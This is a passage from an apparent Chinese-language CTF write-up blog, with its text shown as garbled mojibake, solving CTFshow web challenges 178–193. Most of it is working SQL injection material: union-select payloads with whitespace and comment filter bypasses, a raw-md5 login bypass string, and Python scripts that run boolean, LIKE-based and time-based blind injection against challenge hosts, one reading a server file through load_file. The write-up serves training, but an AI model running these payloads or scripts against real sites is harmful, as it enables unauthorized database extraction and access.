ï¼š</li></ul><p><code>1&#39;%0aor%0a1=1%23</code></p><ul><li><p>å¸¸è§„è§£æ³•</p><ul><li><p>å…¨æ˜¾ç¤º<code>-1&#39;union%0aselect%0apassword,1,2%0afrom%0actfshow_user%23</code></p></li><li><p>åªç­”æ¡ˆ<code>-1&#39;union%0aselect%0aid,username,password%0afrom%0actfshow_user%0awhere%0ausername=&#39;flag&#39;%23</code></p></li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># çˆ†æ•°æ®åº“</span><br><span class="line">-1&#x27;%0aunion%0aselect%0a1,2,database()%23</span><br><span class="line"># æŸ¥è¡¨å</span><br><span class="line">-1&#x27;union%0aselect%0a1,2,group_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=&quot;ctfshow_web&quot;%23</span><br><span class="line"># æŸ¥åˆ—å(å¯çœç•¥ï¼Œå› ä¸ºè¿™é“é¢˜æ˜¾ç¤ºå‡ºæ¥äº†)</span><br><span class="line">-1&#x27;union%0aselect%0a1,2,group_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_name=&quot;ctfshow_user&quot;%23</span><br><span class="line"># çˆ†å­—æ®µ</span><br><span class="line">-1&#x27;union%0aselect%0aid,username,password%0afrom%0actfshow_user%23</span><br></pre></td></tr></table></figure><h4><span id="web179">web179</span></h4><p>å‘ç°è¿™æ¬¡æ˜¯%0aè¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ç”¨%0cæ›¿ä»£%0aã€‚</p><h4><span id="web180">web180</span></h4><p>ä¼ å…¥1â€™%23ï¼Œå‘ç°%23è¢«è¿‡æ»¤äº†ã€‚</p><p>åè¾¹æ²¡åŠæ³•æ³¨é‡Šäº†ï¼Œè¿˜å¯ä»¥ç”¨â€™1â€™&#x3D;â€™1æ¥é—­åˆåè¾¹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union%0cselecT%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%0cwhere%0c&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>è¿˜å¯ä»¥ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or(id=26)and&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>ä¼ è¿›å»åå˜æˆäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where username !=&#x27;flag&#x27; and id = &#x27;&#x27;or(id=26)and&#x27;1&#x27;=&#x27;1&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure><p>å› ä¸ºandçš„ä¼˜å…ˆçº§å¤§äºoræ‰€ä»¥ç›¸å½“äº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where ï¼ˆusername !=&#x27;flag&#x27; and id = &#x27;&#x27;)  or  (id=26and&#x27;1&#x27;=&#x27;1&#x27;)</span><br></pre></td></tr></table></figure><p>orå·¦è¾¹ä¸º0å³è¾¹ä¸º1ï¼Œwhereçš„æ¡ä»¶ä¸º1ï¼Œè€Œä¸”flagåˆšå¥½åœ¨id&#x3D;26ã€‚</p><p>æˆ–è€…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;or(username=concat(&#x27;fl&#x27;,&#x27;ag&#x27;))and&#x27;a&#x27;=&#x27;a</span><br></pre></td></tr></table></figure><h4><span id="web183">web183</span></h4><blockquote><p> åªèƒ½ç›²æ³¨äº†ï¼Œåˆ©ç”¨%åœ¨sqlä¸­é€šé…å¤šä¸ªå­—ç¬¦ï¼Œåˆ©ç”¨_é€šé…ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚<br>æˆåŠŸåä¼šå‘ç°å‘ç°è¿”å›ç»“æœ  $user_count&#x3D;1ä»£è¡¨åŒ¹é…åˆ°äº†ä¸€ä¸ªï¼Œåˆ©ç”¨æ­¤æ¨¡å¼ç›²æ³¨ã€‚</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">url = <span class="string">&quot;http://9ae11c4b-7472-42b5-9064-5ebe182da98c.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line">letter = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letter:</span><br><span class="line">        data = &#123;<span class="string">&quot;tableName&quot;</span>: <span class="string">&quot;(ctfshow_user)where(pass)like&#x27;&#123;&#125;%&#x27;&quot;</span>.<span class="built_in">format</span>(flag + j)&#125;</span><br><span class="line">        r = requests.post(url=url, data=data).text</span><br><span class="line">        <span class="comment"># print(r)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">            sys.exit()</span><br></pre></td></tr></table></figure><h4><span id="web184">web184</span></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : Yn8rt</span></span><br><span class="line"><span class="comment"># @Time    : 2021/7/27 15:04</span></span><br><span class="line"><span class="comment"># @Function:</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://db10ab59-cf2e-4210-a875-b4c3926cc7ce.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">letter = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">asc2hex</span>(<span class="params">s</span>):</span><br><span class="line">    a1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    a2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        a1+=<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))</span><br><span class="line">    a2 = a1.replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> a2</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letter:</span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;ctfshow_user group by pass having pass like &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;0x&quot;</span>+asc2hex(flag+j+<span class="string">&quot;%&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.post(url=url,data=payload).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                sys.exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨likeæ¥çˆ†ç ´</p><h4><span id="web185">web185</span></h4><p>mysqlä¸­çš„åˆ©ç”¨å­—ç¬¦ç»„åˆæˆçš„æ•°å­—ï¼š</p><p><img src="/2023/04/19/ctfshow-Web%E7%AF%87/disda/Desktop/Disda/hexo/source/_posts/ctfshow-Web%E7%AF%87/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : Yn8rt</span></span><br><span class="line"><span class="comment"># @Time    : 2021/7/27 21:52</span></span><br><span class="line"><span class="comment"># @Function:</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createNum</span>(<span class="params">n</span>):</span><br><span class="line">    num = <span class="string">&quot;true&quot;</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            num += <span class="string">&quot;+true&quot;</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createstrNum</span>(<span class="params">m</span>):</span><br><span class="line">    _<span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> m:</span><br><span class="line">        _<span class="built_in">str</span> += <span class="string">&quot;,chr(&quot;</span> + createNum(<span class="built_in">ord</span>(j)) + <span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> _<span class="built_in">str</span>[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://282b6260-a1f9-437d-98f1-a7fb46d977a5.challenge.ctf.show:8080/select-waf.php&quot;</span></span><br><span class="line">letter = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letter:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&#x27;ctfshow_user group by pass having pass like concat(&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(createstrNum(flag + j + <span class="string">&quot;%&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url, data=data).text</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">            sys.exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="web187">web187</span></h4><p>md5($pass,true)ç»•è¿‡</p><blockquote><p>md5(string,raw)å…¶ä¸­rawå‚æ•°å¯é€‰ï¼Œä¸”æœ‰ä¸¤ç§é€‰æ‹©</p><p>FALSEï¼š32ä½16è¿›åˆ¶çš„å­—ç¬¦ä¸²<br>TRUEï¼š16ä½åŸå§‹äºŒè¿›åˆ¶æ ¼å¼çš„å­—ç¬¦ä¸²<br>å½“æœ‰trueè¿™ä¸ªå‚æ•°ï¼Œä¼šä»¥äºŒè¿›åˆ¶çš„å½¢å¼è¾“å‡º16ä¸ªå­—ç¬¦ã€‚è¿”å›çš„è¿™ä¸ªåŸå§‹äºŒè¿›åˆ¶ä¸æ˜¯æ™®é€šçš„0 1äºŒè¿›åˆ¶ã€‚</p></blockquote><p>å†çœ‹ä¸‹ä¸€ä¸ªçŸ¥è¯†ç‚¹</p><p>åœ¨mysqlé‡Œé¢ï¼Œåœ¨ç”¨ä½œå¸ƒå°”å‹åˆ¤æ–­æ—¶ï¼Œä»¥1å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«å½“åšæ•´å‹æ•°ã€‚è¦æ³¨æ„çš„æ˜¯è¿™ç§æƒ…å†µæ˜¯å¿…é¡»è¦æœ‰å•å¼•å·æ‹¬èµ·æ¥çš„ï¼Œæ¯”å¦‚password&#x3D;â€˜xxxâ€™ or â€˜1xxxxxxxxxâ€™ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºpassword&#x3D;â€˜xxxâ€™ or 1 ï¼Œä¹Ÿå°±ç›¸å½“äºpassword&#x3D;â€˜xxxâ€™ or trueï¼Œæ‰€ä»¥è¿”å›å€¼å°±æ˜¯trueã€‚å½“ç„¶åœ¨æˆ‘åæ¥æµ‹è¯•ä¸­å‘ç°ï¼Œä¸åªæ˜¯1å¼€å¤´ï¼Œåªè¦æ˜¯æ•°å­—å¼€å¤´éƒ½æ˜¯å¯ä»¥çš„ã€‚<br>å½“ç„¶å¦‚æœåªæœ‰æ•°å­—çš„è¯ï¼Œå°±ä¸éœ€è¦å•å¼•å·ï¼Œæ¯”å¦‚password&#x3D;â€˜xxxâ€™ or 1ï¼Œé‚£ä¹ˆè¿”å›å€¼ä¹Ÿæ˜¯trueã€‚ï¼ˆxxxæŒ‡ä»£ä»»æ„å­—ç¬¦ï¼‰</p><p>å› æ­¤æˆ‘ä»¬æ„é€ ä¸€ä¸ªpassä½¿å¾—md5åæ˜¯<code>â€˜xxxâ€™ or æ•°å­—å¼€å¤´ </code>ï¼Œå‘ç°<code>ffifdyop</code>å¯ä»¥è¾¾åˆ°æ­¤æ•ˆæœ</p><h4><span id="web-188">web 188</span></h4><p>mysqlä¸­å­—æ¯ä¸æ•°å­—çš„æ¯”è¾ƒè¿‡ç¨‹ï¼š</p><p>ä½ å¯ä»¥å°è¯•ä¸€ä¸‹åœ¨æ•°æ®åº“ä¸­ä½¿ç”¨è¿™æ ·çš„è¯­å¥ï¼š<br>select * from stu where name&#x3D;0å¾ˆæœ‰å¯èƒ½æ˜¯èƒ½æŸ¥è¯¢å‡ºä¸œè¥¿çš„ï¼Œå³ä½¿ä½ æ²¡æœ‰nameä¸º0çš„æ•°æ®</p><p>è¿™æ˜¯å› ä¸ºæ•°æ®åº“è¿›è¡Œäº†å¼±æ¯”è¾ƒï¼Œå®ƒselectå‡ºæ‰€æœ‰nameæ˜¯ä»¥å­—æ¯ä¸ºå¼€å¤´çš„æ•°æ®<br>ä»¥å­—æ¯ä¸ºå¼€å¤´çš„å­—ç¬¦å‹æ•°æ®åœ¨ä¸æ•°å­—å‹æ¯”è¾ƒæ—¶ï¼Œä¼šå¼ºåˆ¶è½¬åŒ–ä¸º0ï¼Œå†ä¸æ•°å­—æ¯”è¾ƒï¼ˆè¿™é‡Œå¾ˆç±»ä¼¼äºPHPçš„å¼±æ¯”è¾ƒï¼‰<br>å‡è®¾æˆ‘ä»¬usernameä¸º0ï¼Œé‚£ä¹ˆå°±ä¼šç›¸ç­‰ï¼Œä»è€ŒåŒ¹é…æˆåŠŸ</p><h4><span id="web189">web189</span></h4><p><a href="https://www.cnblogs.com/blacksunny/p/8060028.html"><code>load_file</code>ç»“åˆ<code>regexp</code>ç›²æ³¨</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : Yn8rt</span></span><br><span class="line"><span class="comment"># @Time    : 2021/7/30 15:48</span></span><br><span class="line"><span class="comment"># @Function:</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://6ef6bc21-0110-4f40-bb9e-d260d53faac1.challenge.ctf.show:8080/api/index.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">letter = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letter:</span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;if(load_file(&#x27;/var/www/html/api/index.php&#x27;)regexp(&#x27;&#123;&#125;&#x27;),0,1)&quot;</span>.<span class="built_in">format</span>(flag + j),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url,data=payload)</span><br><span class="line">        <span class="comment">#print(r)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;å¯†ç é”™è¯¯&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            sys.exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="web190">web190</span></h4><ul><li><p>æ—¶é—´ç›²æ³¨</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:Kradress</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://cd828d70-8321-49a4-b845-f407fa23f67f.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_fl0g</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#çˆ†å­—æ®µå€¼</span></span><br><span class="line">payload = <span class="string">&quot;select f1ag from `ctfshow_fl0g`&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span> <span class="comment"># ä¸­é—´æŒ‡é’ˆç­‰äºå¤´å°¾æŒ‡é’ˆç›¸åŠ çš„ä¸€åŠ</span></span><br><span class="line">        <span class="comment"># print(mid)</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span> : <span class="string">f&quot;admin&#x27; and if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(3),1)#&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span> : <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data, timeout=<span class="number">0.8</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            head = mid + <span class="number">1</span> <span class="comment">#sleepå¯¼è‡´è¶…æ—¶</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>  è„šæœ¬è·‘å‡ºæ¥å¯èƒ½ä¼šé”™ï¼Œè¦å¤šè·‘å‡ æ¬¡å¯¹æ¯”ä¸€ä¸‹</p><h4><span id="web191">web191</span></h4><p>  æŠŠä¸Šé¢˜çš„asciiæ¢æˆord</p><h4><span id="web192">web192</span></h4>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    @Author disda</span></span><br><span class="line"><span class="string">    @Date 2023/5/26 09:51</span></span><br><span class="line"><span class="string">    @Describe </span></span><br><span class="line"><span class="string">    @Dependency</span></span><br><span class="line"><span class="string">    @Version 1.0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># @Author:Kradress</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://2296ab53-69f2-42c9-844d-28848bc82366.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># çˆ†è¡¨å</span></span><br><span class="line"><span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line"><span class="comment"># çˆ†åˆ—å</span></span><br><span class="line"><span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;ctfshow_fl0g&#x27;&quot;</span></span><br><span class="line"><span class="comment"># çˆ†å­—æ®µå€¼</span></span><br><span class="line">payload = <span class="string">&quot;select f1ag from `ctfshow_fl0g`&quot;</span></span><br><span class="line">uuid = string.ascii_lowercase + string.digits + <span class="string">&quot;&#123;-_&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> uuid:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;admin&#x27; and if(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,sleep(3),1)#&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data, timeout=<span class="number">0.8</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result += char  <span class="comment"># sleepå¯¼è‡´è¶…æ—¶</span></span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> char == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></li></ul><h4><span id="web193">web193</span></h4><p>strsubä¸ç»™ç”¨äº†,midã€leiftã€rightéƒ½å¯ä»¥</p><p>right<br>ä»å³è¾¹å¼€å§‹æˆªå–,é…åˆasciiä½¿ç”¨.<br>ascii(â€˜strâ€™)è¿”å›å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiç <br>ascii(right(â€˜abcâ€™,2))&#x3D; 97ç›¸å½“äº ascii(â€˜bcâ€™)&#x3D;97</p><p>left<br>ä»å·¦è¾¹å¼€å§‹æˆªå–,ç”¨reverseåè½¬</p><p>ascii(reverse(left(â€˜abcâ€™,2))) &#x3D; 97 ç›¸å½“äº ascii(â€˜bcâ€™)&#x3D;97</p><p>midå’Œstrsubæ•ˆæœä¸€æ 